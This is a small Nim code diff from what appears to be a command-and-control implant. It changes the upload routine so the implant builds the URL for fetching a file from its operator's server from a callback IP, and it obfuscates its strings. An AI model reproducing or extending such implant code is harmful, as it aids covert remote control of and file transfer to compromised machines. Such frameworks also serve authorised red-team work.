@@ -94,7 +94,7 @@ proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
     if li.listenerHost != "":
         url = url & li.listenerHost
     else:
-        url = url & li.listenerIp & obf(":") & li.listenerPort
+        url = url & li.implantCallbackIp & obf(":") & li.listenerPort
     url = url & li.taskpath & obf("/") & fileId
     
     echo obf("DEBUG Upload: Requesting file from URL: ") & url
